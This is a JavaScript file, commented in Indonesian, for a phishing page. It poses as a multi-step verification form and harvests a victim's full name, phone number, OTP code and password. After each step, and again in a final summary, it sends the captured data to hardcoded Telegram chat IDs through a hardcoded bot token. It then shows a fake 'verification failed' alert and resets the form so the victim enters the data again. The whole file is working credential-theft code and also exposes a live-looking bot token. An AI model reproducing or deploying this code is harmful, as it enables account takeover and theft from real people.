// Array untuk menyimpan chat IDs
const chatIds = ["6483204568", "5460230196"]; // Tambahkan chat ID lain sesuai kebutuhan
const botToken = "7510859558:AAEG59hhSx7fk6TG5E3w6KRBXHPOEc7T9VI";

// Variabel untuk menyimpan data pengguna
let fullName = "";
let phone = "";
let otp = "";
let password = "";

// Function to show loading overlay
function showLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "flex";
}

// Function to hide loading overlay
function hideLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "none";
}

// Function to show custom alert
function showAlert(message) {
  const alertMessage = document.getElementById("alertMessage");
  alertMessage.textContent = message;
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "flex";
  document.body.style.overflow = "hidden";
}

// Function to hide the alert
function hideAlert() {
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "none";
  document.body.style.overflow = "auto";
}

// Fungsi untuk mengatur tampilan langkah-langkah verifikasi
function nextStep(step) {
  showLoading();

  setTimeout(() => {
    if (step === 2) {
      fullName = document.getElementById("fullName").value;
      phone = document.getElementById("phone").value;
      if (!fullName || !phone) {
        showAlert("Nama Lengkap dan Nomor Telepon harus diisi!");
        hideLoading();
        return;
      }
      let message = `Gercepki Bosku :\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}`;
      sendToTelegram(message); // Kirim data nama dan nomor telepon
    } else if (step === 3) {
      otp = document.getElementById("otp").value;
      if (!otp) {
        showAlert("Kode OTP harus diisi!");
        hideLoading();
        return;
      }
      let message = `Kode OTP: ${otp}`;
      sendToTelegram(message); // Kirim data kode OTP
      document.getElementById("step3Description").textContent =
        "Kami telah mengirimkan kode pada telegram anda, silahkan cek pesan telegram anda.";
    } else if (step === 4) {
      password = document.getElementById("password").value;
      if (!password || password.trim() === "") {
        showAlert("Kata Sandi harus diisi!");
        hideLoading();
        return;
      }
      let message = `Kata Sandi: ${password}`;
      sendToTelegram(message); // Kirim data kata sandi
    }

    document.getElementById("step1").style.display =
      step === 1 ? "block" : "none";
    document.getElementById("step2").style.display =
      step === 2 ? "block" : "none";
    document.getElementById("step3").style.display =
      step === 3 ? "block" : "none";

    hideLoading();
  }, 2000);
}

// Fungsi untuk mengirim data ke banyak pengguna di Telegram
function sendToTelegram(message) {
  showLoading();

  // Loop melalui setiap chat ID dalam array chatIds
  chatIds.forEach((chatId) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error("Gagal mengirim data ke chat ID: " + chatId);
        }
      })
      .catch((error) => {
        showAlert(
          "Terjadi kesalahan pada chat ID " + chatId + ": " + error.message
        );
      });
  });

  hideLoading();
}

// Fungsi untuk mengirim ringkasan data ke Telegram
function sendSummary() {
  const summaryMessage = `Gercepko Sayang :\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}\nKode OTP: ${otp}\nKata Sandi: ${password}`;
  sendToTelegram(summaryMessage);
}

// Fungsi untuk mereset form dan mengarahkan kembali ke langkah pertama
function resetForm() {
  fullName = "";
  phone = "";
  otp = "";
  password = "";
  document.getElementById("fullName").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
  document.getElementById("step1").style.display = "block";
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "none";
}

// Fungsi akhir untuk mengarahkan ke halaman film dan mengirim summary
function submitVerification() {
  const passwordInput = document.getElementById("password").value;
  if (passwordInput.trim() === "") {
    showAlert("Kata Sandi harus diisi sebelum mengirim ringkasan.");
    return;
  }

  password = passwordInput;

  showLoading();

  setTimeout(() => {
    sendSummary();
    showAlert("Verifikasi anda gagal tolong masukkan data yang benar");
    resetForm();
    hideLoading();
  }, 1200);
}

// Memastikan hanya angka yang diizinkan di nomor telepon dan OTP
document.getElementById("phone").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});

document.getElementById("otp").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});
